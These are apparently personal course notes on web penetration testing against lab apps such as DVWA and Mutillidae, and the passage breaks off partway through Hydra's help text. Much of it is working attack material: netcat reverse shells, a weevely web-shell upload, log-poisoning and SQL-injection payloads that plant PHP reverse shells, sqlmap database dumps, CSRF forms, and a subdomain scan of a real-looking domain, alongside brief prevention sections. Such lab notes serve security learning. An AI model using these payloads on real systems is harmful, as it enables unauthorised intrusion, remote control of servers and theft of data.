
Information Gathering
--------------------

"Gathering target website's info by the following"

whois.domaintools.com
toolbar.netcraft.com/site_report?url=
www.robtex.com

"To find subdomains of target - https://github.com/guelfoweb/knock.git"

> chmod -R 755 knock
> sudo su
> python3 setup.py install
> knockpy --version
> knockpy --help

> knockpy isecurity.org
  _  __                 _                
 | |/ /                | |   v5.1.0            
 | ' / _ __   ___   ___| | ___ __  _   _ 
 |  < | '_ \ / _ \ / __| |/ / '_ \| | | |
 | . \| | | | (_) | (__|   <| |_) | |_| |
 |_|\_\_| |_|\___/ \___|_|\_\ .__/ \__, |
                            | |     __/ |
                            |_|    |___/ 

local: 2019 | google: 0 | duckduckgo: 1 | virustotal: 0 
                                                                                                                            
Wordlist: 2020 | Target: isecurity.org | Ip: 95.211.73.102 
                                                                                                                            
06:44:06

Ip address      Code Subdomain                     Server                        Real hostname
--------------- ---- ----------------------------- ----------------------------- -----------------------------
95.211.73.102   200  cpanel.isecurity.org          Apache                                                     
95.211.73.102   401  cpcalendars.isecurity.org     cPanel                                                     
95.211.73.102   200  ftp.isecurity.org             Apache                                                     
5.79.69.19      403  mail.isecurity.org            Apache                                                     
95.211.73.102   401  whm.isecurity.org             Apache                                                     
95.211.73.102   200  www.isecurity.org             Apache                        isecurity.org
                                                                                
06:51:28

Ip address: 2 | Subdomain: 6 | elapsed time: 00:07:21 

Discovering sensitive files
---------------------------

> dirb --version
> dirb [target_address] [wordlist] [options]
> man dirb

> dirb [target_address]


-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Aug 22 09:29:23 2021
URL_BASE: http://192.168.104.6/mutillidae/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.104.6/mutillidae/ ----
==> DIRECTORY: http://192.168.104.6/mutillidae/classes/                                                                   
+ http://192.168.104.6/mutillidae/credits (CODE:200|SIZE:509)                                                             
==> DIRECTORY: http://192.168.104.6/mutillidae/documentation/                                                             
+ http://192.168.104.6/mutillidae/favicon.ico (CODE:200|SIZE:1150)                                                        
+ http://192.168.104.6/mutillidae/footer (CODE:200|SIZE:450)                                                              
+ http://192.168.104.6/mutillidae/header (CODE:200|SIZE:19879)                                                            
+ http://192.168.104.6/mutillidae/home (CODE:200|SIZE:2930)                                                               
==> DIRECTORY: http://192.168.104.6/mutillidae/images/                                                                    
+ http://192.168.104.6/mutillidae/inc (CODE:200|SIZE:386260)                                                              
==> DIRECTORY: http://192.168.104.6/mutillidae/includes/                                                                  
+ http://192.168.104.6/mutillidae/index (CODE:200|SIZE:24237)                                                             
+ http://192.168.104.6/mutillidae/index.php (CODE:200|SIZE:24237)                                                         
+ http://192.168.104.6/mutillidae/installation (CODE:200|SIZE:8138)                                                       
==> DIRECTORY: http://192.168.104.6/mutillidae/javascript/                                                                
+ http://192.168.104.6/mutillidae/login (CODE:200|SIZE:4102)                                                              
+ http://192.168.104.6/mutillidae/notes (CODE:200|SIZE:1721)                                                              
+ http://192.168.104.6/mutillidae/page-not-found (CODE:200|SIZE:705)                                                      
==> DIRECTORY: http://192.168.104.6/mutillidae/passwords/                                                                 
+ http://192.168.104.6/mutillidae/phpinfo (CODE:200|SIZE:48888)                                                           
+ http://192.168.104.6/mutillidae/phpinfo.php (CODE:200|SIZE:48900)                                                       
+ http://192.168.104.6/mutillidae/phpMyAdmin (CODE:200|SIZE:174)                                                          
+ http://192.168.104.6/mutillidae/register (CODE:200|SIZE:1823)                                                           
+ http://192.168.104.6/mutillidae/robots (CODE:200|SIZE:160)                                                              
+ http://192.168.104.6/mutillidae/robots.txt (CODE:200|SIZE:160)                                                          
==> DIRECTORY: http://192.168.104.6/mutillidae/styles/                                                                    
                                                                                                                          
---- Entering directory: http://192.168.104.6/mutillidae/classes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                          
---- Entering directory: http://192.168.104.6/mutillidae/documentation/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                          
---- Entering directory: http://192.168.104.6/mutillidae/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                          
---- Entering directory: http://192.168.104.6/mutillidae/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                          
---- Entering directory: http://192.168.104.6/mutillidae/javascript/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                          
---- Entering directory: http://192.168.104.6/mutillidae/passwords/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                          
---- Entering directory: http://192.168.104.6/mutillidae/styles/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Sun Aug 22 09:29:30 2021
DOWNLOADED: 4612 - FOUND: 18
                  
To build up social engineering map use - Maltego

File Upload Vulnerabilities
---------------------------

"Required Tools - Metasploitable 2, DVWA, Weevely"

> weevely --version


[+] weevely 4.0.1
[!] Error: the following arguments are required: url, password

[+] Run terminal or command on the target
    weevely <URL> <password> [cmd]

[+] Recover an existing session
    weevely session <path> [cmd]

[+] Generate new agent
    weevely generate <password> <path>

> weevely generate [password] [path]/[file_name].php

"Upload file to target, it can see uploaded URI/URL in page because it is lab page."

> weevely [target_address]/dvwa/hackable/uploads/[file_name].php [password]

[+] weevely 4.0.1

[+] Target:     192.168.104.6
[+] Session:    /home/zawmoehtike/.weevely/sessions/192.168.104.6/backdoor_0.session

[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.

weevely > ls

The remote script execution triggers an error 500, check script and payload integrity
114-1149126_apple-clipart-black-and-white-image-small-clip.png
backdoor.php
dvwa_email.png
index.jpeg
lorem_text.txt

www-data@192.168.104.6:/var/www/dvwa/hackable/uploads $ ls -l

The remote script execution triggers an error 500, check script and payload integrity
total 84
-rw------- 1 www-data www-data 54593 Aug 22 10:11 114-1149126_apple-clipart-black-and-white-image-small-clip.png
-rw------- 1 www-data www-data   744 Aug 22 10:27 backdoor.php
-rw-r--r-- 1 www-data www-data   667 Mar 16  2010 dvwa_email.png
-rw------- 1 www-data www-data  8573 Aug 22 10:14 index.jpeg
-rw------- 1 www-data www-data    10 Aug 22 10:12 lorem_text.txt

www-data@192.168.104.6:/var/www/dvwa/hackable/uploads $ help

The remote script execution triggers an error 500, check script and payload integrity

 :net_ifconfig                 Get network interfaces addresses.                                    
 :net_phpproxy                 Install PHP proxy on the target.                                     
 :net_curl                     Perform a curl-like HTTP request.                                    
 :net_mail                     Send mail.                                                           
 :net_proxy                    Run local proxy to pivot HTTP/HTTPS browsing through the target.     
 :net_scan                     TCP Port scan.                                                       
 :sql_console                  Execute SQL query or run console.                                    
 :sql_dump                     Multi dbms mysqldump replacement.                                    
 :file_gzip                    Compress or expand gzip files.                                       
 :file_clearlog                Remove string from a file.                                           
 :file_touch                   Change file timestamp.                                               
 :file_cp                      Copy single file.                                                    
 :file_cd                      Change current working directory.                                    
 :file_download                Download file from remote filesystem.                                
 :file_mount                   Mount remote filesystem using HTTPfs.                                
 :file_check                   Get attributes and permissions of a file.                            
 :file_enum                    Check existence and permissions of a list of paths.                  
 :file_zip                     Compress or expand zip files.                                        
 :file_upload2web              Upload file automatically to a web folder and get corresponding URL. 
 :file_edit                    Edit remote file on a local editor.                                  
 :file_webdownload             Download an URL.                                                     
 :file_read                    Read remote file from the remote filesystem.                         
 :file_bzip2                   Compress or expand bzip2 files.                                      
 :file_ls                      List directory content.                                              
 :file_upload                  Upload file to remote filesystem.                                    
 :file_rm                      Remove remote file.                                                  
 :file_find                    Find files with given names and attributes.                          
 :file_tar                     Compress or expand tar archives.                                     
 :file_grep                    Print lines matching a pattern in multiple files.                    
 :backdoor_tcp                 Spawn a shell on a TCP port.                                         
 :backdoor_reversetcp          Execute a reverse TCP shell.                                         
 :bruteforce_sql               Bruteforce SQL database.                                             
 :system_extensions            Collect PHP and webserver extension list.                            
 :system_procs                 List running processes.                                              
 :system_info                  Collect system information.                                          
 :audit_filesystem             Audit the file system for weak permissions.                          
 :audit_disablefunctionbypass  Bypass disable_function restrictions with mod_cgi and .htaccess.     
 :audit_suidsgid               Find files with SUID or SGID flags.                                  
 :audit_phpconf                Audit PHP configuration.                                             
 :audit_etcpasswd              Read /etc/passwd with different techniques.                          
 :shell_su                     Execute commands with su.                                            
 :shell_php                    Execute PHP commands.                                                
 :shell_sh                     Execute shell commands.  

Intercepting Requests
--------------------

"Used tool - Burp Suite"

"It is GUI tool."

"Setup using Burp Suite as proxy in Firefox."

"Bypass file uploading by uploading file extension as [file_name].php.jpg"

"So, it will execute as this => weevely [target_address]/dvwa/hackable/uploads/[file_name].php.jpg [password]"

Code Execution Vulnerability
---------------------------

"Used tool - Net Cat"

"Type the following in Hacker' machine"

> nc -vv -l -p 8080

listening on [any] 8080 ...
192.168.104.6: inverse host lookup failed: Unknown host
connect to [192.168.104.3] from (UNKNOWN) [192.168.104.6] 34553

> ls
> cd [dir_name]
> ls
> cd ..

"Execute the following in Target server"

> [your_ip_address] nc -e /bin/sh [your_ip_address] 8080

or

> [your_ip_address] | nc -e /bin/sh [your_ip_address] 8080

Local File Inclusion Vulnerability
---------------------------------

"Used tool - Net Cat, Burp Suit"

"Allow attacker to read any file on the same server."
"Access file outside www directory."

> http://192.168.104.6/dvwa/vulnerabilities/fi/?page=include.php

> http://192.168.104.6/dvwa/vulnerabilities/fi/?page=[file_name].php

"If it include file that do not exit, it will show error message as below."

Warning: include(include1.php) [function.include]: failed to open stream: No such file or directory in /var/www/dvwa/vulnerabilities/fi/index.php on line 35

Warning: include() [function.include]: Failed opening 'include1.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear:../../external/phpids/0.6/lib/') in /var/www/dvwa/vulnerabilities/fi/index.php on line 35

Warning: Cannot modify header information - headers already sent by (output started at /var/www/dvwa/vulnerabilities/fi/index.php:35) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 324

Warning: Cannot modify header information - headers already sent by (output started at /var/www/dvwa/vulnerabilities/fi/index.php:35) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 325

Warning: Cannot modify header information - headers already sent by (output started at /var/www/dvwa/vulnerabilities/fi/index.php:35) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 326

> http://192.168.104.6/dvwa/vulnerabilities/fi/?page=/etc/passwd

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh dhcp:x:101:102::/nonexistent:/bin/false syslog:x:102:103::/home/syslog:/bin/false klog:x:103:104::/home/klog:/bin/false sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash bind:x:105:113::/var/cache/bind:/bin/false postfix:x:106:115::/var/spool/postfix:/bin/false ftp:x:107:65534::/home/ftp:/bin/false postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false distccd:x:111:65534::/:/bin/false user:x:1001:1001:just a user,111,,:/home/user:/bin/bash service:x:1002:1002:,,,:/home/service:/bin/bash telnetd:x:112:120::/nonexistent:/bin/false proftpd:x:113:65534::/var/run/proftpd:/bin/false statd:x:114:65534::/var/lib/nfs:/bin/false
Warning: Cannot modify header information - headers already sent by (output started at /etc/passwd:12) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 324

Warning: Cannot modify header information - headers already sent by (output started at /etc/passwd:12) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 325

Warning: Cannot modify header information - headers already sent by (output started at /etc/passwd:12) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 326

"Try to inject code into readable files."

/proc/self/environ
/var/log/auth.log
/var/log/apache2/access.log

> http://192.168.104.6/dvwa/vulnerabilities/fi/?page=/var/log/auth.log

"Let intercept by using Burp Suit"

> http://192.168.104.6/dvwa/vulnerabilities/fi/?page=/proc/self/environ

"While Intercepting, Put that code in User Agent in Burp Suite => <?phpinfo();?>"

"While Intercepting, Put that code in User Agent in Burp Suite => <?passthru("nc -e /bin/sh [your_ip_address] 8888");?> for Explotation"

> nc -vv -l -p 8888

listening on [any] 8888 ...

192.168.104.6: inverse host lookup failed: Unknown host
connect to [192.168.104.3] from (UNKNOWN) [192.168.104.6] 46580
ls
help
include.php
index.php
source

"Encode this as Base64 => nc -e /bin/sh [your_ip_address] 8000"

"Decoded string => bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjEwNC42IDgwMDA="

> ssh [user_name]@[target_ip]

"Sure you don't have target username and password"

"You can execute the following code"

> ssh "<?passthru(base64_decode('bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjEwNC42IDgwMDA='));?>"@192.168.104.6

Remote File Inclusion Vulnerability
---------------------------------

"Allow an attacker to read, execute any file from any server."
"Store php files on other server server as txt."

"Imagine you can access target server via ssh"

> ssh [user_name]@[target_ip]

> vim /etc/php5/cgi/php.ini

"Make sure in /etc/php5/cgi/php.ini file => allow_url_include = On"

> http://192.168.104.6/dvwa/vulnerabilities/fi/?page=http://192.168.104.3/index.html

"Write this in reverse.txt => <?passthru("nc -e /bin/sh [your_ip_address] 8888");?>"

"Put revere.txt under /var/www/html"

> nc -vv -l -p 8888

listening on [any] 8888 ...
192.168.104.6: inverse host lookup failed: Unknown host
connect to [192.168.104.3] from (UNKNOWN) [192.168.104.6] 53985                                                            
ls                                                                                                                         
help                                                                                                                       
include.php
index.php
source

"Bypassing remote file inclusion as (hTTp://...) => hTTp://192.168.104.6/dvwa/vulnerabilities/fi/?page=hTTp://192.168.104.3/reverse.txt"

SQL Injection - Login
-------------

"Discovering SQL"

"Try to break page, Use 'and', 'order by', '\'', Test text boxes and url parameters on the form"

"Type the following in input field of password"

> 123456' AND 1=1#

SELECT * FROM accounts WHERE username='zaw' AND password='123456' AND 1=1#'

"Type the follwoing in input field of username"

> admin' #

SELECT * FROM accounts WHERE username='admin' #AND password=''

"It will just execute => SELECT * FROM accounts WHERE username='admin'"

> zaw' #

SELECT * FROM accounts WHERE username='zaw' #AND password=''

"It will just execute => SELECT * FROM accounts WHERE username='zaw'"

SQL Injection - Data
-------------

"Test with Mutillidae Web App Offline => OWASP Top 10 > A1 Injection > SQLi Extract Data > User Info"

> http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details

> http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw' order by 1#&password=123456&user-info-php-submit-button=View+Account+Details

"Replace # with %23"

> http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw' order by 1%23&password=123456&user-info-php-submit-button=View+Account+Details

> http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw' %23&password=123456&user-info-php-submit-button=View+Account+Details

"can add this => union select 1,database(),user(),version(),5"

> http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw%27%20union%20select%201,database(),user(),version(),5%23&password=123456&user-info-php-submit-button=View+Account+Details

"To fetch tables name => union select 1,table_name,null,null,5 from information_schema.tables where table_schema='owasp10'"

"To fetch columns => union select 1,column_name,null,null,5 from information_schema.columns where table_name='accounts'"

"To fetch records => union select 1,username,password,is_admin,5 from accounts"

SQL Injection
-------------

"In DVWA's SQL Injection"

"Input the following in input field"

"Bypass by writing => aND, anD, aNd, /****/,etc"

> 1' aNd /****/ 1=1 #

"Input the following in url field"

> http://192.168.104.6/dvwa/vulnerabilities/sqli/?id=1%27+aNd+%2F****%2F+1%3D1+%23&Submit=Submit#

> http://192.168.104.6/dvwa/vulnerabilities/sqli/?id=1' union select 1,2%23&Submit=Submit#

ID: 1' union select 1,2#
First name: admin
Surname: admin

ID: 1' union select 1,2#
First name: 1
Surname: 2

> http://192.168.104.6/dvwa/vulnerabilities/sqli/?id=1' union select table_name,2 from information_schema.tables%23&Submit=Submit#

> http://192.168.104.6/dvwa/vulnerabilities/sqli/?id=1' union select 1,table_name from information_schema.tables%23&Submit=Submit#

SQL Injection
-------------

"In mutillidae"

"Reading /etc/passwd file by SQL Injection"

> http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw' union select null,load_file('/etc/passwd'),null,null,null %23&password=123456&user-info-php-submit-button=View+Account+Details

"Reading texts to a file by SQL Injection"

"Assume /var/www/mutillidae/ was allow permission to write"

> http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw' union select null,'example example',null,null,null into outfile '/var/www/mutillidae/example.txt' %23&password=123456&user-info-php-submit-button=View+Account+Details

"It can write Net Cat to file by SQL Injection and execute via Web Browser"

"In DVWA"

> union select '<?passthru("nc -e /bin/sh [your_ip_address] [your_port]");?>',null into outfile '/tmp/reverse.php'

"Listen from your device"

> nc -vv -l -p [your_port]

"Execute via Web Browser"

> [target_domain]/dvwa/vulnerabilities/fi/?page=../../../../../tmp/reverse.php

SQL Injection - SQL Map
-------------

"Tool designed to exploit sql injections."
"Works with many databases types (MySQL, MSSQL, etc)."

> sqlmap --help
> sqlmap -u [target_url]

> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details"

"The following command exploit databases"

> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" --dbs

> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" --current-user

"The following command exploit current database"

> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" --current-db

"The following command exploit tables of current database"

> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" --tables -D [database_name]

> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" --tables -D owasp10

"The following command exploit columns of table of current database"

> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" --columns -T [table_name]

> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" --columns -T accounts

"The following command query all records in table"

> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" -T [table_name] -D [database_name] --dump

> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" -T accounts -D owasp10 --dump

> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" --os-shell

"The following command is for executing SQL Shell"

> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" --sql-shell

sql-shell > current_user()
sql-shell > user()
sql-shell > database()
sql-shell > select table_name from information_schema.tables where table_schema = [table_name] [6];
sql-shell > select table_name from information_schema.tables where table_schema = 'owasp10' [6];

SQL Injection - Prevention
------------

"Filters, Using black list of commands, Using white list of commands can be bypassed."
"Use parameterized statements and separate data from SQL code."

Example:

Psue-do-code

<?php

$user_name = admin' union select ... #

select * from accounts where username=$user_name

"Use the following instead of above"

Safe:
    ->prepare("select * from accounts where username = ?")
    ->execute(array('$user_name'))

XSS
---

"XSS = Cross Site Scripting"

"Allow an attacker to inject js code into the page, code is executed when the page, code is executed on client machine not the server."

(3) Main Types of XSS
- Persistent/Stored XSS
- Reflected XSS
- DOM based XSS

"In DVWA, XSS reflected => http://192.168.104.6/dvwa/vulnerabilities/xss_r/"

"In DVWA => http://192.168.104.6/dvwa/vulnerabilities/xss_s/"

"Test the following js code"

<script>alert("XSS")</script>

<script>alert(String.fromCharCode(85, 110, 99, 108, 101, 32, 74, 105, 109))</script>

"In Mutillidae => http://192.168.104.6/mutillidae/index.php?page=password-generator.php"

"In Mutillidae => http://192.168.104.6/mutillidae/index.php?page=password-generator.php&username=zaw"

"Test the following js code in url"

> ";alert("xss");//

> http://192.168.104.6/mutillidae/index.php?page=password-generator.php&username=zaw%22;alert(%22xss%22);//

BeEF
----

BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser. ... BeEF will hook one or more web browsers and use them as beachheads for launching directed command modules and further attacks against the system from within the browser context.

Ref: https://beefproject.com/

"Inject beef code in => http://192.168.104.6/dvwa/vulnerabilities/xss_s/"

Veil
---

Veil is a tool designed to generate metasploit payloads that bypass common anti-virus solutions.

Ref: https://github.com/Veil-Framework/Veil

Metasploit
----------

Metasploit is a penetration testing platform that enables you to find, exploit, and validate vulnerabilities. It provides the infrastructure, content, and tools to perform penetration tests and extensive security auditing and thanks to the open source community and Rapid7’s own hard working content team, new modules are added on a regular basis, which means that the latest exploit is available to you as soon as it’s published.

Ref: https://tools.kali.org/exploitation-tools/metasploit-framework

"Generate backdoor in Veil then deliver by BeEf after that listen on Metasploit."

No Distribute
-------------

Scan your file online with multiple different antiviruses without distributing the results of your scan.

Ref: https://nodistribute.com/

XSS - Prevention
---

<?php

echo '<pre>';
echo 'Hello ' . htmlspecialchars($_GET['name']);
echo '</pre>';

CSRF
----

Cross Site Request Frogery
- Requests are not validated at the server side.
- Server does not check if the user generated the request.
- Requests can be forged and send to users to make them do things they don't intend to do such as changing password.

"Login to Mutillidae and check using Cookie Manager"

In Firefox, download and add Cookie Manager from the following
=> https://addons.mozilla.org/en-US/firefox/addon/a-cookie-manager/
=> https://addons.mozilla.org/en-US/firefox/addon/cookie-quick-manager/

"Login to DVWA"

"Copy form code"

<form action="http://192.168.104.6/dvwa/vulnerabilities/csrf/" method="GET">    
    New password:<br>
    <input type="password" AUTOCOMPLETE="off" name="password_new"><br>
    Confirm new password: <br>
    <input type="password" AUTOCOMPLETE="off" name="password_conf">
    <br>
    <input type="submit" value="Change" name="Change">
</form>

<form id="form1" action="http://192.168.104.6/dvwa/vulnerabilities/csrf/" method="GET">    
    New password:<br>
    <input type="hidden" AUTOCOMPLETE="off" name="password_new" value="replace_with_your_new_one"><br>
    Confirm new password: <br>
    <input type="hidden" AUTOCOMPLETE="off" name="password_conf" value="replace_with_your_new_one">
</form>
<script>document.getElementById('form1').submit();</script>

CSRF - Prevention 
----

"Request user to enter current password."

[Enter Current Password]

[Enter New Password]

[Enter Confirm New Password]

"Use CSRF token in web forms (Server will only accept form if the unique token is returned)."

<form action="http://192.168.104.6/dvwa/vulnerabilities/csrf/" method="GET">   
    <input name="csrf-token" value="unique_web_form_token" type="hidden"></input> 
    New password:<br>
    <input type="password" AUTOCOMPLETE="off" name="password_new"><br>
    Confirm new password: <br>
    <input type="password" AUTOCOMPLETE="off" name="password_conf">
    <br>
    <input type="submit" value="Change" name="Change">
</form>

Dynamic Synchronizing Tokens

1) Generate an unpredictable token.
    - Token needs to be a large value.
    - Must be randon
    - Should be unique
2) Embed it in web form.
3) Verify token when the form is submitted.

"Go to => http://192.168.104.6/mutillidae/index.php?page=add-to-your-blog.php"

"Inspect page and it will see CSRF Token if there is choosed high security."

Brute Force & Dictionary Attack
-----------------------------

Brute Force - try all possible combinations
Dictionary - try passwords in the list only

Used Tools - Crunch, Hydra

Crunch - generate word list file
Hydra - attack using Crunch word list

> crunch --version

crunch version 3.6

Crunch can create a wordlist based on criteria you specify.  The output from crunch can be sent to the screen, file, or to another program.

Usage: crunch <min> <max> [options]
where min and max are numbers

Please refer to the man page for instructions and examples on how to use crunch.

> crunch 6 8 123abc$ -o word_list_file.txt -t a@@@@b

> hydra --vesion

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

hydra: invalid option -- '-'

> hydra -help

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]

Options:
  -R        restore a previous aborted/crashed session
  -I        ignore an existing restore file (don't wait 10 seconds)
  -S        perform an SSL connect
  -s PORT   if the service is on a different default port, define it here
  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
  -x MIN:MAX:CHARSET  password bruteforce generation, type "-x -h" to get help
  -y        disable use of symbols in bruteforce, see above
  -r             rainy mode for password generation (-x)
  -e nsr    try "n" null password, "s" login as pass and/or "r" reversed login
  -u        loop around users, not passwords (effective! implied with -x)
  -C FILE   colon separated "login:pass" format, instead of -L/-P options
  -M FILE   list of servers to attack, one entry per line, ':' to specify port
  -o FILE   write found login/password pairs to FILE instead of stdout
  -b FORMAT specify the format for the -o FILE: text(default), json, jsonv1
  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
  -t TASKS  run TASKS number of connects in parallel per target (default: 16)
  -T TASKS  run TASKS connects in parallel overall (for -M, default: 64)
  -w / -W TIME  wait time for a response (32) / between connects per thread (0)
  -c TIME   wait time per login attempt over all threads (enforces -t 1)
  -4 / -6   use IPv4 (default) / IPv6 addresses (put always in [] also in -M)
  -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode 
  -O        use old SSL v2 and v3
  -K        do not redo failed attempts (good for -M mass scanning)
  -q        do not print messages about connection errors
  -U        service module usage details
  -m OPT    options specific for a module, see -U output for information
  -h        more command line options (COMPLETE HELP)
  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
  service   the service to crack (see below for supported protocols)
  OPT       some service modules support additional input (-U for module help)

Supported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp

Hydra is a tool to guess/crack valid login/password pairs.
Licensed under AGPL v3.0. The newest version is always available at;
https://github.com/vanhauser-thc/thc-hydra
Please don't use in military or secret service organizations, or for illegal
purposes. (This is a wish and non-binding - most such people do not care about
laws and ethics anyway - and tell themselves they are one of the good ones.)
These services were not compiled in: afp ncp oracle sapr3 smb2.

Use HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables for a proxy setup.
E.g. % export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)
     % export HYDRA_PROXY=connect_and_socks_proxylist.txt  (up to 64 entries)
     % export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080
     % export HYDRA_PROXY_HTTP=proxylist.txt  (up to 64 entries)

Examples:
  hydra -l user -P passlist.txt ftp://192.168.0.1
  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
  hydra -l admin -p password ftp://[192.168.0.0/24]/
  hydra -L logins.txt -P pws.txt -M targets.txt ssh

> hydra -U http-post-form

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-28 10:05:02

Help for module http-post-form:
============================================================================
Module http-post-form requires the page and the parameters for the web form.

By default this module is configured to follow a maximum of 5 redirections in
a row. It always gathers a new cookie from the same URL without variables
The parameters take three ":" separated values, plus optional values.
(Note: if you need a colon in the option string as value, escape it with "\:", but do not escape a "\" with "\\".)

Syntax:   <url>:<form parameters>:<condition string>[:<optional>[:<optional>]
First is the page on the server to GET or POST to (URL).
Second is the POST/GET variables (taken from either the browser, proxy, etc.
 with url-encoded (resp. base64-encoded) usernames and passwords being replaced in the
